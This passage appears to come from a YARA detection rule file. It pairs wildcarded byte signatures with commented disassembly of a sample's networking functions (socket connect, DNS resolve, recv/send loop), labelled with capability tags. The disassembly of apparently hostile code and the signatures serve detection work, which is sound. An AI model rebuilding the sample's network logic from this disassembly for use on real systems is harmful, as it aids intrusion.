        .text:0x00401cd0           -12: int local12
        .text:0x00401cd0           -32: int local32
        .text:0x00401cd0           -36: int local36
        .text:0x00401cd0           -40: int local40
        .text:0x00401cd0           -44: int local44
        .text:0x00401cd0  
        .text:0x00401cd0  6aff             push 0xffffffff    ;int
        .text:0x00401cd2  64a100000000     fs: mov eax,dword [0x00000000]
        .text:0x00401cd8  68b6834000       push 0x004083b6
        .text:0x00401cdd  50               push eax
        .text:0x00401cde  b85c230000       mov eax,0x0000235c
        .text:0x00401ce3  64892500000000   fs: mov dword [0x00000000],esp
        .text:0x00401cea  e821610000       call 0x00407e10    ;__alloca_probe()
        .text:0x00401cef  53               push ebx
        .text:0x00401cf0  55               push ebp
        .text:0x00401cf1  8b2d78904000     mov ebp,dword [0x00409078]
        .text:0x00401cf7  56               push esi
        .text:0x00401cf8  57               push edi
        .text:0x00401cf9  6a00             push 0
        .text:0x00401cfb  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401cfd  8d4c243c         lea ecx,dword [esp + 60]
        .text:0x00401d01  e8faf2ffff       call 0x00401000    ;sub_00401000(0xbfb07fd0)
        .text:0x00401d06  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00401d0a  c784247423000000 mov dword [esp + 9076],0
        .text:0x00401d15  e8e6f2ffff       call 0x00401000    ;sub_00401000(local8)
        .text:0x00401d1a  8b9c247c230000   mov ebx,dword [esp + 9084]
        .text:0x00401d21  c684247423000001 mov byte [esp + 9076],1
        .text:0x00401d29  8bcb             mov ecx,ebx
        .text:0x00401d2b  c784246401000001 mov dword [esp + 356],1
        .text:0x00401d36  8b83a8000000     mov eax,dword [ebx + 168]
        .text:0x00401d3c  89842468010000   mov dword [esp + 360],eax
        .text:0x00401d43  e888020000       call 0x00401fd0    ;sub_00401fd0(0x61616161)
        .text:0x00401d48  84c0             test al,al
        .text:0x00401d4a  0f842d020000     jz 0x00401f7d
        .text:0x00401d50  loc_00401d50: [1 XREFS]
        .text:0x00401d50  b941000000       mov ecx,65
        .text:0x00401d55  8db42464010000   lea esi,dword [esp + 356]
        .text:0x00401d5c  8dbc2468020000   lea edi,dword [esp + 616]
        .text:0x00401d63  6a00             push 0
        .text:0x00401d65  f3a5             rep: movsd 
        .text:0x00401d67  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401d69  6a00             push 0
        .text:0x00401d6b  6a00             push 0
        .text:0x00401d6d  8d8c2470020000   lea ecx,dword [esp + 624]
        .text:0x00401d74  6a00             push 0
        .text:0x00401d76  51               push ecx
        .text:0x00401d77  6a00             push 0
        .text:0x00401d79  ff1510924000     call dword [0x00409210]    ;ws2_32.select(0,0xbfb081fc,0,0,0)
        .text:0x00401d7f  83f8ff           cmp eax,0xffffffff
        .text:0x00401d82  0f84ee010000     jz 0x00401f76
        .text:0x00401d88  85c0             test eax,eax
        .text:0x00401d8a  0f8ed3010000     jle 0x00401f63
        .text:0x00401d90  b900080000       mov ecx,2048
        .text:0x00401d95  33c0             xor eax,eax
        .text:0x00401d97  8dbc246c030000   lea edi,dword [esp + 876]
        .text:0x00401d9e  6a01             push 1
        .text:0x00401da0  f3ab             rep: stosd 
        .text:0x00401da2  ffd5             call ebp    ;kernel32.Sleep(1)
        .text:0x00401da4  8b83a8000000     mov eax,dword [ebx + 168]
        .text:0x00401daa  6a00             push 0
        .text:0x00401dac  8d942470030000   lea edx,dword [esp + 880]
        .text:0x00401db3  6800200000       push 0x00002000
        .text:0x00401db8  52               push edx
        .text:0x00401db9  50               push eax
        .text:0x00401dba  ff150c924000     call dword [0x0040920c]    ;ws2_32.recv(0x61616161,0xbfb08300,0x00002000)
        .text:0x00401dc0  8bf0             mov esi,eax
        .text:0x00401dc2  6a00             push 0
        .text:0x00401dc4  85f6             test esi,esi
        .text:0x00401dc6  0f8ea8010000     jle 0x00401f74
        .text:0x00401dcc  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401dce  8d8c246c030000   lea ecx,dword [esp + 876]
        .text:0x00401dd5  56               push esi
        .text:0x00401dd6  51               push ecx
        .text:0x00401dd7  8d4c241c         lea ecx,dword [esp + 28]
        .text:0x00401ddb  e8a0f2ffff       call 0x00401080    ;sub_00401080(local12,0xbfb082fc,ws2_32.recv(0x61616161,0xbfb08300,0x00002000))
        .text:0x00401de0  b93f000000       mov ecx,63
        .text:0x00401de5  33c0             xor eax,eax
        .text:0x00401de7  8d7c2465         lea edi,dword [esp + 101]
        .text:0x00401deb  c644246400       mov byte [esp + 100],0
        .text:0x00401df0  f3ab             rep: stosd 
        .text:0x00401df2  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401df8  6800010000       push 256
        .text:0x00401dfd  66ab             stosd 
        .text:0x00401dff  8d542468         lea edx,dword [esp + 104]
        .text:0x00401e03  68a0a74000       push 0x0040a7a0
        .text:0x00401e08  52               push edx
        .text:0x00401e09  aa               stosb 
        .text:0x00401e0a  e851270000       call 0x00404560    ;sub_00404560(0xbfb07fec,0x0040a7a0,256)
        .text:0x00401e0f  6a00             push 0
        .text:0x00401e11  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401e13  83fe09           cmp esi,9
        .text:0x00401e16  7c11             jl 0x00401e29
        .text:0x00401e18  8d84246c030000   lea eax,dword [esp + 876]
        .text:0x00401e1f  6a09             push 9
        .text:0x00401e21  8d4c2468         lea ecx,dword [esp + 104]
        .text:0x00401e25  50               push eax
        .text:0x00401e26  51               push ecx
        .text:0x00401e27  eb0e             jmp 0x00401e37
        .text:0x00401e29  loc_00401e29: [1 XREFS]
        .text:0x00401e29  8d94246c030000   lea edx,dword [esp + 876]
        .text:0x00401e30  56               push esi
        .text:0x00401e31  8d442468         lea eax,dword [esp + 104]
        .text:0x00401e35  52               push edx
        .text:0x00401e36  50               push eax
        .text:0x00401e37  loc_00401e37: [1 XREFS]
        .text:0x00401e37  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401e3d  e8ae2b0000       call 0x004049f0    ;sub_004049f0(0xbfb07fec,0xbfb082f4,<0x00401dba>)
        .text:0x00401e42  6a00             push 0
        .text:0x00401e44  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401e46  8d8c246c030000   lea ecx,dword [esp + 876]
        .text:0x00401e4d  56               push esi
        .text:0x00401e4e  51               push ecx
        .text:0x00401e4f  8d4c2444         lea ecx,dword [esp + 68]
        .text:0x00401e53  e828f2ffff       call 0x00401080    ;sub_00401080(0xbfb07fc4,0xbfb082f4,<0x00401dba>)
        .text:0x00401e58  6a00             push 0
        .text:0x00401e5a  c744241400000000 mov dword [esp + 20],0
        .text:0x00401e62  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401e64  6a04             push 4
        .text:0x00401e66  6a05             push 5
        .text:0x00401e68  8d4c2444         lea ecx,dword [esp + 68]
        .text:0x00401e6c  e81ff7ffff       call 0x00401590    ;sub_00401590(0xbfb07fbc,5)
        .text:0x00401e71  8d542414         lea edx,dword [esp + 20]
        .text:0x00401e75  50               push eax
        .text:0x00401e76  52               push edx
        .text:0x00401e77  e86a5f0000       call 0x00407de6    ;msvcrt.memmove(local36,sub_00401590(0xbfb07fbc,5),5)
        .text:0x00401e7c  83c40c           add esp,12
        .text:0x00401e7f  6a00             push 0
        .text:0x00401e81  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401e83  6a00             push 0
        .text:0x00401e85  8d4c2440         lea ecx,dword [esp + 64]
        .text:0x00401e89  bf94a54000       mov edi,0x0040a594
        .text:0x00401e8e  e8fdf6ffff       call 0x00401590    ;sub_00401590(0xbfb07fb8,0)
        .text:0x00401e93  8bf0             mov esi,eax
        .text:0x00401e95  b905000000       mov ecx,5
        .text:0x00401e9a  33c0             xor eax,eax
        .text:0x00401e9c  f3a6             rep: cmpsb 
        .text:0x00401e9e  50               push eax
        .text:0x00401e9f  0f85a2000000     jnz 0x00401f47
        .text:0x00401ea5  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401ea7  8b442410         mov eax,dword [esp + 16]
        .text:0x00401eab  85c0             test eax,eax
        .text:0x00401ead  0f84b0000000     jz 0x00401f63
        .text:0x00401eb3  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00401eb7  e8c4f3ffff       call 0x00401280    ;sub_00401280(local36)
        .text:0x00401ebc  8b4c2410         mov ecx,dword [esp + 16]
        .text:0x00401ec0  3bc1             cmp eax,ecx
        .text:0x00401ec2  0f829b000000     jc 0x00401f63
        .text:0x00401ec8  51               push ecx
        .text:0x00401ec9  e82e5f0000       call 0x00407dfc    ;msvcrt.??2@YAPAXI@Z(0xbfb082fc)
        .text:0x00401ece  8b4c2414         mov ecx,dword [esp + 20]
        .text:0x00401ed2  83c404           add esp,4
        .text:0x00401ed5  8bf0             mov esi,eax
        .text:0x00401ed7  51               push ecx
        .text:0x00401ed8  6a00             push 0
        .text:0x00401eda  8d4c241c         lea ecx,dword [esp + 28]
        .text:0x00401ede  e8adf6ffff       call 0x00401590    ;sub_00401590(local36,0)
        .text:0x00401ee3  50               push eax
        .text:0x00401ee4  56               push esi
        .text:0x00401ee5  e8fc5e0000       call 0x00407de6    ;msvcrt.memmove(msvcrt.??2@YAPAXI@Z(0xbfb082fc),sub_00401590(local36,0),0)
        .text:0x00401eea  83c40c           add esp,12
        .text:0x00401eed  8d4c243c         lea ecx,dword [esp + 60]
        .text:0x00401ef1  e8eaf5ffff       call 0x004014e0    ;sub_004014e0(0xbfb07fb0)
        .text:0x00401ef6  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00401efa  e8e1f5ffff       call 0x004014e0    ;sub_004014e0(local40)
        .text:0x00401eff  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401f05  6800010000       push 256
        .text:0x00401f0a  8d542468         lea edx,dword [esp + 104]
        .text:0x00401f0e  68a0a74000       push 0x0040a7a0
        .text:0x00401f13  52               push edx
        .text:0x00401f14  e847260000       call 0x00404560    ;sub_00404560(0xbfb07fd8,0x0040a7a0,256)
        .text:0x00401f19  8d4c2464         lea ecx,dword [esp + 100]
        .text:0x00401f1d  8b442410         mov eax,dword [esp + 16]
        .text:0x00401f21  50               push eax
        .text:0x00401f22  56               push esi
        .text:0x00401f23  51               push ecx
        .text:0x00401f24  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00401f2a  e8c12a0000       call 0x004049f0    ;sub_004049f0(0xbfb07fd8,<0x00401ec9>,<0x00401dba>)
        .text:0x00401f2f  8bcb             mov ecx,ebx
        .text:0x00401f31  8b542410         mov edx,dword [esp + 16]
        .text:0x00401f35  52               push edx
        .text:0x00401f36  56               push esi
        .text:0x00401f37  e8a4000000       call 0x00401fe0    ;sub_00401fe0(0x61616161,<0x00401ec9>,<0x00401dba>)
        .text:0x00401f3c  56               push esi
        .text:0x00401f3d  e89e5e0000       call 0x00407de0    ;msvcrt.??3@YAXPAX@Z(<0x00401ec9>)
        .text:0x00401f42  83c404           add esp,4
        .text:0x00401f45  eb1c             jmp 0x00401f63
        .text:0x00401f47  loc_00401f47: [1 XREFS]
        .text:0x00401f47  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401f49  8d4c243c         lea ecx,dword [esp + 60]
        .text:0x00401f4d  e88ef5ffff       call 0x004014e0    ;sub_004014e0(arg0)
        .text:0x00401f52  6a00             push 0
        .text:0x00401f54  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401f56  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00401f5a  e881f5ffff       call 0x004014e0    ;sub_004014e0(local36)
        .text:0x00401f5f  6a00             push 0
        .text:0x00401f61  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401f63  loc_00401f63: [4 XREFS]
        .text:0x00401f63  8bcb             mov ecx,ebx
        .text:0x00401f65  e866000000       call 0x00401fd0    ;sub_00401fd0(0x61616161)
        .text:0x00401f6a  84c0             test al,al
        .text:0x00401f6c  0f85defdffff     jnz 0x00401d50
        .text:0x00401f72  eb09             jmp 0x00401f7d
        .text:0x00401f74  loc_00401f74: [1 XREFS]
        .text:0x00401f74  ffd5             call ebp    ;kernel32.Sleep(0)
        .text:0x00401f76  loc_00401f76: [1 XREFS]
        .text:0x00401f76  8bcb             mov ecx,ebx
        .text:0x00401f78  e833020000       call 0x004021b0    ;sub_004021b0(0x61616161)
        .text:0x00401f7d  loc_00401f7d: [2 XREFS]
        .text:0x00401f7d  8d4c2414         lea ecx,dword [esp + 20]
        .text:0x00401f81  c684247423000000 mov byte [esp + 9076],0
        .text:0x00401f89  e8c2f0ffff       call 0x00401050    ;sub_00401050(local8)
        .text:0x00401f8e  8d4c243c         lea ecx,dword [esp + 60]
        .text:0x00401f92  c7842474230000ff mov dword [esp + 9076],0xffffffff
        .text:0x00401f9d  e8aef0ffff       call 0x00401050    ;sub_00401050(0xbfb07fd0)
        .text:0x00401fa2  8b8c246c230000   mov ecx,dword [esp + 9068]
        .text:0x00401fa9  5f               pop edi
        .text:0x00401faa  5e               pop esi
        .text:0x00401fab  5d               pop ebp
        .text:0x00401fac  83c8ff           or eax,0xffffffff
        .text:0x00401faf  5b               pop ebx
        .text:0x00401fb0  64890d00000000   fs: mov dword [0x00000000],ecx
        .text:0x00401fb7  81c468230000     add esp,0x00002368
        .text:0x00401fbd  c20400           ret 4
        */
        $c28 = { 6A FF 64 A1 ?? ?? ?? ?? 68 B6 83 40 00 50 B8 5C 23 00 00 64 89 25 ?? ?? ?? ?? E8 ?? ?? ?? ?? 53 55 8B 2D ?? ?? ?? ?? 56 57 6A 00 FF D5 8D 4C 24 ?? E8 ?? ?? ?? ?? 8D 4C 24 ?? C7 84 24 ?? ?? ?? ?? 00 00 00 00 E8 ?? ?? ?? ?? 8B 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 01 8B CB C7 84 24 ?? ?? ?? ?? 01 00 00 00 8B 83 ?? ?? ?? ?? 89 84 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 84 C0 0F 84 ?? ?? ?? ?? B9 41 00 00 00 8D B4 24 ?? ?? ?? ?? 8D BC 24 ?? ?? ?? ?? 6A 00 F3 A5 FF D5 6A 00 6A 00 8D 8C 24 ?? ?? ?? ?? 6A 00 51 6A 00 FF 15 ?? ?? ?? ?? 83 F8 FF 0F 84 ?? ?? ?? ?? 85 C0 0F 8E ?? ?? ?? ?? B9 00 08 00 00 33 C0 8D BC 24 ?? ?? ?? ?? 6A 01 F3 AB FF D5 8B 83 ?? ?? ?? ?? 6A 00 8D 94 24 ?? ?? ?? ?? 68 00 20 00 00 52 50 FF 15 ?? ?? ?? ?? 8B F0 6A 00 85 F6 0F 8E ?? ?? ?? ?? FF D5 8D 8C 24 ?? ?? ?? ?? 56 51 8D 4C 24 ?? E8 ?? ?? ?? ?? B9 3F 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 F3 AB 8B 0D ?? ?? ?? ?? 68 00 01 00 00 66 AB 8D 54 24 ?? 68 A0 A7 40 00 52 AA E8 ?? ?? ?? ?? 6A 00 FF D5 83 FE 09 7C ?? 8D 84 24 ?? ?? ?? ?? 6A 09 8D 4C 24 ?? 50 51 EB ?? 8D 94 24 ?? ?? ?? ?? 56 8D 44 24 ?? 52 50 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D5 8D 8C 24 ?? ?? ?? ?? 56 51 8D 4C 24 ?? E8 ?? ?? ?? ?? 6A 00 C7 44 24 ?? 00 00 00 00 FF D5 6A 04 6A 05 8D 4C 24 ?? E8 ?? ?? ?? ?? 8D 54 24 ?? 50 52 E8 ?? ?? ?? ?? 83 C4 0C 6A 00 FF D5 6A 00 8D 4C 24 ?? BF 94 A5 40 00 E8 ?? ?? ?? ?? 8B F0 B9 05 00 00 00 33 C0 F3 A6 50 0F 85 ?? ?? ?? ?? FF D5 8B 44 24 ?? 85 C0 0F 84 ?? ?? ?? ?? 8D 4C 24 ?? E8 ?? ?? ?? ?? 8B 4C 24 ?? 3B C1 0F 82 ?? ?? ?? ?? 51 E8 ?? ?? ?? ?? 8B 4C 24 ?? 83 C4 04 8B F0 51 6A 00 8D 4C 24 ?? E8 ?? ?? ?? ?? 50 56 E8 ?? ?? ?? ?? 83 C4 0C 8D 4C 24 ?? E8 ?? ?? ?? ?? 8D 4C 24 ?? E8 ?? ?? ?? ?? 8B 0D ?? ?? ?? ?? 68 00 01 00 00 8D 54 24 ?? 68 A0 A7 40 00 52 E8 ?? ?? ?? ?? 8D 4C 24 ?? 8B 44 24 ?? 50 56 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 8B CB 8B 54 24 ?? 52 56 E8 ?? ?? ?? ?? 56 E8 ?? ?? ?? ?? 83 C4 04 EB ?? FF D5 8D 4C 24 ?? E8 ?? ?? ?? ?? 6A 00 FF D5 8D 4C 24 ?? E8 ?? ?? ?? ?? 6A 00 FF D5 8B CB E8 ?? ?? ?? ?? 84 C0 0F 85 ?? ?? ?? ?? EB ?? FF D5 8B CB E8 ?? ?? ?? ?? 8D 4C 24 ?? C6 84 24 ?? ?? ?? ?? 00 E8 ?? ?? ?? ?? 8D 4C 24 ?? C7 84 24 ?? ?? ?? ?? FF FF FF FF E8 ?? ?? ?? ?? 8B 8C 24 ?? ?? ?? ?? 5F 5E 5D 83 C8 FF 5B 64 89 0D ?? ?? ?? ?? 81 C4 68 23 00 00 C2 04 00 }
        /*
function at 0x00402310@9324d1a8ae37a36ae560c37448c9705a with 2 features:
          - send data
          - send data on socket
        .text:0x00402310  
        .text:0x00402310  FUNC: int thiscall_caller sub_00402310( void * ecx, int arg1, int arg2, int arg3, ) [2 XREFS] 
        .text:0x00402310  
        .text:0x00402310  Stack Variables: (offset from initial top of stack)
        .text:0x00402310            12: int arg3
        .text:0x00402310             8: int arg2
        .text:0x00402310             4: int arg1
        .text:0x00402310          -255: int local255
        .text:0x00402310          -256: int local256
        .text:0x00402310          -260: int local260
        .text:0x00402310          -264: int local264
        .text:0x00402310  
        .text:0x00402310  81ec08010000     sub esp,264
        .text:0x00402316  53               push ebx
        .text:0x00402317  55               push ebp
        .text:0x00402318  56               push esi
        .text:0x00402319  8be9             mov ebp,ecx
        .text:0x0040231b  57               push edi
        .text:0x0040231c  b93f000000       mov ecx,63
        .text:0x00402321  33c0             xor eax,eax
        .text:0x00402323  8d7c2419         lea edi,dword [esp + 25]
        .text:0x00402327  c644241800       mov byte [esp + 24],0
        .text:0x0040232c  6800010000       push 256
        .text:0x00402331  f3ab             rep: stosd 
        .text:0x00402333  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00402339  68a0a74000       push 0x0040a7a0
        .text:0x0040233e  66ab             stosd 
        .text:0x00402340  aa               stosb 
        .text:0x00402341  8d442420         lea eax,dword [esp + 32]
        .text:0x00402345  c744241800000000 mov dword [esp + 24],0
        .text:0x0040234d  50               push eax
        .text:0x0040234e  e80d220000       call 0x00404560    ;sub_00404560(local256,0x0040a7a0,256)
        .text:0x00402353  8b9c2420010000   mov ebx,dword [esp + 288]
        .text:0x0040235a  8bbc241c010000   mov edi,dword [esp + 284]
        .text:0x00402361  53               push ebx
        .text:0x00402362  8d4c241c         lea ecx,dword [esp + 28]
        .text:0x00402366  57               push edi
        .text:0x00402367  51               push ecx
        .text:0x00402368  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x0040236e  e87d260000       call 0x004049f0    ;sub_004049f0(local256,arg1,arg2)
        .text:0x00402373  8bb42424010000   mov esi,dword [esp + 292]
        .text:0x0040237a  8bc3             mov eax,ebx
        .text:0x0040237c  3bc6             cmp eax,esi
        .text:0x0040237e  724c             jc 0x004023cc
        .text:0x00402380  loc_00402380: [1 XREFS]
        .text:0x00402380  c744241400000000 mov dword [esp + 20],0
        .text:0x00402388  loc_00402388: [1 XREFS]
        .text:0x00402388  8b95a8000000     mov edx,dword [ebp + 168]
        .text:0x0040238e  6a00             push 0
        .text:0x00402390  56               push esi
        .text:0x00402391  57               push edi
        .text:0x00402392  52               push edx
        .text:0x00402393  ff1514924000     call dword [0x00409214]    ;ws2_32.send(0x61616161,arg1,arg3,0)
        .text:0x00402399  85c0             test eax,eax
        .text:0x0040239b  7f0e             jg 0x004023ab
        .text:0x0040239d  8b4c2414         mov ecx,dword [esp + 20]
        .text:0x004023a1  41               inc ecx
        .text:0x004023a2  83f90f           cmp ecx,15
        .text:0x004023a5  894c2414         mov dword [esp + 20],ecx
        .text:0x004023a9  7cdd             jl 0x00402388
        .text:0x004023ab  loc_004023ab: [1 XREFS]
        .text:0x004023ab  837c24140f       cmp dword [esp + 20],15
        .text:0x004023b0  7464             jz 0x00402416
        .text:0x004023b2  8b4c2410         mov ecx,dword [esp + 16]
        .text:0x004023b6  6a0a             push 10
        .text:0x004023b8  03c8             add ecx,eax
        .text:0x004023ba  03fe             add edi,esi
        .text:0x004023bc  894c2414         mov dword [esp + 20],ecx
        .text:0x004023c0  ff1578904000     call dword [0x00409078]    ;kernel32.Sleep(10)
        .text:0x004023c6  2bde             sub ebx,esi
        .text:0x004023c8  3bde             cmp ebx,esi
        .text:0x004023ca  73b4             jnc 0x00402380
        .text:0x004023cc  loc_004023cc: [1 XREFS]
        .text:0x004023cc  85db             test ebx,ebx
        .text:0x004023ce  762a             jbe 0x004023fa
        .text:0x004023d0  33f6             xor esi,esi
        .text:0x004023d2  loc_004023d2: [1 XREFS]
        .text:0x004023d2  8b85a8000000     mov eax,dword [ebp + 168]
        .text:0x004023d8  6a00             push 0
        .text:0x004023da  53               push ebx
        .text:0x004023db  57               push edi
        .text:0x004023dc  50               push eax
        .text:0x004023dd  ff1514924000     call dword [0x00409214]    ;ws2_32.send(0x61616161,arg1,arg2,0)
        .text:0x004023e3  85c0             test eax,eax
        .text:0x004023e5  7f06             jg 0x004023ed
        .text:0x004023e7  46               inc esi
        .text:0x004023e8  83fe0f           cmp esi,15
        .text:0x004023eb  7ce5             jl 0x004023d2
        .text:0x004023ed  loc_004023ed: [1 XREFS]
        .text:0x004023ed  83fe0f           cmp esi,15
        .text:0x004023f0  7424             jz 0x00402416
        .text:0x004023f2  8b4c2410         mov ecx,dword [esp + 16]
        .text:0x004023f6  03c8             add ecx,eax
        .text:0x004023f8  eb04             jmp 0x004023fe
        .text:0x004023fa  loc_004023fa: [1 XREFS]
        .text:0x004023fa  8b4c2410         mov ecx,dword [esp + 16]
        .text:0x004023fe  loc_004023fe: [1 XREFS]
        .text:0x004023fe  3b8c2420010000   cmp ecx,dword [esp + 288]
        .text:0x00402405  750f             jnz 0x00402416
        .text:0x00402407  5f               pop edi
        .text:0x00402408  5e               pop esi
        .text:0x00402409  5d               pop ebp
        .text:0x0040240a  8bc1             mov eax,ecx
        .text:0x0040240c  5b               pop ebx
        .text:0x0040240d  81c408010000     add esp,264
        .text:0x00402413  c20c00           ret 12
        .text:0x00402416  loc_00402416: [3 XREFS]
        .text:0x00402416  5f               pop edi
        .text:0x00402417  5e               pop esi
        .text:0x00402418  5d               pop ebp
        .text:0x00402419  83c8ff           or eax,0xffffffff
        .text:0x0040241c  5b               pop ebx
        .text:0x0040241d  81c408010000     add esp,264
        .text:0x00402423  c20c00           ret 12
        */
        $c29 = { 81 EC 08 01 00 00 53 55 56 8B E9 57 B9 3F 00 00 00 33 C0 8D 7C 24 ?? C6 44 24 ?? 00 68 00 01 00 00 F3 AB 8B 0D ?? ?? ?? ?? 68 A0 A7 40 00 66 AB AA 8D 44 24 ?? C7 44 24 ?? 00 00 00 00 50 E8 ?? ?? ?? ?? 8B 9C 24 ?? ?? ?? ?? 8B BC 24 ?? ?? ?? ?? 53 8D 4C 24 ?? 57 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 8B B4 24 ?? ?? ?? ?? 8B C3 3B C6 72 ?? C7 44 24 ?? 00 00 00 00 8B 95 ?? ?? ?? ?? 6A 00 56 57 52 FF 15 ?? ?? ?? ?? 85 C0 7F ?? 8B 4C 24 ?? 41 83 F9 0F 89 4C 24 ?? 7C ?? 83 7C 24 ?? 0F 74 ?? 8B 4C 24 ?? 6A 0A 03 C8 03 FE 89 4C 24 ?? FF 15 ?? ?? ?? ?? 2B DE 3B DE 73 ?? 85 DB 76 ?? 33 F6 8B 85 ?? ?? ?? ?? 6A 00 53 57 50 FF 15 ?? ?? ?? ?? 85 C0 7F ?? 46 83 FE 0F 7C ?? 83 FE 0F 74 ?? 8B 4C 24 ?? 03 C8 EB ?? 8B 4C 24 ?? 3B 8C 24 ?? ?? ?? ?? 75 ?? 5F 5E 5D 8B C1 5B 81 C4 08 01 00 00 C2 0C 00 5F 5E 5D 83 C8 FF 5B 81 C4 08 01 00 00 C2 0C 00 }
        /*
function at 0x00401800@9324d1a8ae37a36ae560c37448c9705a with 4 features:
          - act as TCP client
          - connect TCP socket
          - resolve DNS
          - set socket configuration
        .text:0x00401800  
        .text:0x00401800  FUNC: int thiscall_caller sub_00401800( void * ecx, int arg1, int arg2, ) [4 XREFS] 
        .text:0x00401800  
        .text:0x00401800  Stack Variables: (offset from initial top of stack)
        .text:0x00401800             8: int arg2
        .text:0x00401800             4: int arg1
        .text:0x00401800           -12: int local12
        .text:0x00401800           -14: int local14
        .text:0x00401800           -16: int local16
        .text:0x00401800           -24: int local24
        .text:0x00401800           -28: int local28
        .text:0x00401800           -32: int local32
        .text:0x00401800  
        .text:0x00401800  83ec1c           sub esp,28
        .text:0x00401803  55               push ebp
        .text:0x00401804  8b6c2424         mov ebp,dword [esp + 36]
        .text:0x00401808  56               push esi
        .text:0x00401809  57               push edi
        .text:0x0040180a  85ed             test ebp,ebp
        .text:0x0040180c  8bf1             mov esi,ecx
        .text:0x0040180e  750b             jnz 0x0040181b
        .text:0x00401810  5f               pop edi
        .text:0x00401811  5e               pop esi
        .text:0x00401812  33c0             xor eax,eax
        .text:0x00401814  5d               pop ebp
        .text:0x00401815  83c41c           add esp,28
        .text:0x00401818  c20800           ret 8
        .text:0x0040181b  loc_0040181b: [1 XREFS]
        .text:0x0040181b  8b442430         mov eax,dword [esp + 48]
        .text:0x0040181f  85c0             test eax,eax
        .text:0x00401821  750b             jnz 0x0040182e
        .text:0x00401823  5f               pop edi
        .text:0x00401824  5e               pop esi
        .text:0x00401825  33c0             xor eax,eax
        .text:0x00401827  5d               pop ebp
        .text:0x00401828  83c41c           add esp,28
        .text:0x0040182b  c20800           ret 8
        .text:0x0040182e  loc_0040182e: [1 XREFS]
        .text:0x0040182e  8bce             mov ecx,esi
        .text:0x00401830  e87b090000       call 0x004021b0    ;sub_004021b0(ecx)
        .text:0x00401835  8b86ac000000     mov eax,dword [esi + 172]
        .text:0x0040183b  50               push eax
        .text:0x0040183c  ff1590904000     call dword [0x00409090]    ;kernel32.ResetEvent(0x61616161)
        .text:0x00401842  c686b000000000   mov byte [esi + 176],0
        .text:0x00401849  a19ca54000       mov eax,dword [0x0040a59c]
        .text:0x0040184e  85c0             test eax,eax
        .text:0x00401850  7415             jz 0x00401867
        .text:0x00401852  83f804           cmp eax,4
        .text:0x00401855  7410             jz 0x00401867
        .text:0x00401857  83f805           cmp eax,5
        .text:0x0040185a  740b             jz 0x00401867
        .text:0x0040185c  5f               pop edi
        .text:0x0040185d  5e               pop esi
        .text:0x0040185e  33c0             xor eax,eax
        .text:0x00401860  5d               pop ebp
        .text:0x00401861  83c41c           add esp,28
        .text:0x00401864  c20800           ret 8
        .text:0x00401867  loc_00401867: [3 XREFS]
        .text:0x00401867  6a06             push 6
        .text:0x00401869  6a01             push 1
        .text:0x0040186b  6a02             push 2
        .text:0x0040186d  ff1500924000     call dword [0x00409200]    ;ws2_32.socket(2,1,6)
        .text:0x00401873  83f8ff           cmp eax,0xffffffff
        .text:0x00401876  8986a8000000     mov dword [esi + 168],eax
        .text:0x0040187c  750b             jnz 0x00401889
        .text:0x0040187e  5f               pop edi
        .text:0x0040187f  5e               pop esi
        .text:0x00401880  33c0             xor eax,eax
        .text:0x00401882  5d               pop ebp
        .text:0x00401883  83c41c           add esp,28
        .text:0x00401886  c20800           ret 8
        .text:0x00401889  loc_00401889: [1 XREFS]
        .text:0x00401889  55               push ebp
        .text:0x0040188a  ff15fc914000     call dword [0x004091fc]    ;ws2_32.gethostbyname(arg1)
        .text:0x00401890  8bf8             mov edi,eax
        .text:0x00401892  85ff             test edi,edi
        .text:0x00401894  7509             jnz 0x0040189f
        .text:0x00401896  5f               pop edi
        .text:0x00401897  5e               pop esi
        .text:0x00401898  5d               pop ebp
        .text:0x00401899  83c41c           add esp,28
        .text:0x0040189c  c20800           ret 8
        .text:0x0040189f  loc_0040189f: [1 XREFS]
        .text:0x0040189f  a19ca54000       mov eax,dword [0x0040a59c]
        .text:0x004018a4  66c74424180200   mov word [esp + 24],2
        .text:0x004018ab  85c0             test eax,eax
        .text:0x004018ad  740a             jz 0x004018b9
        .text:0x004018af  668b0d20a04000   mov cx,word [0x0040a020]
        .text:0x004018b6  51               push ecx
        .text:0x004018b7  eb05             jmp 0x004018be
        .text:0x004018b9  loc_004018b9: [1 XREFS]
        .text:0x004018b9  8b542430         mov edx,dword [esp + 48]
        .text:0x004018bd  52               push edx
        .text:0x004018be  loc_004018be: [1 XREFS]
        .text:0x004018be  ff15f8914000     call dword [0x004091f8]    ;ws2_32.htons(arg2)
        .text:0x004018c4  668944241a       mov word [esp + 26],ax
        .text:0x004018c9  8b470c           mov eax,dword [edi + 12]
        .text:0x004018cc  6a10             push 16
        .text:0x004018ce  8b08             mov ecx,dword [eax]
        .text:0x004018d0  8d44241c         lea eax,dword [esp + 28]
        .text:0x004018d4  50               push eax
        .text:0x004018d5  8b11             mov edx,dword [ecx]
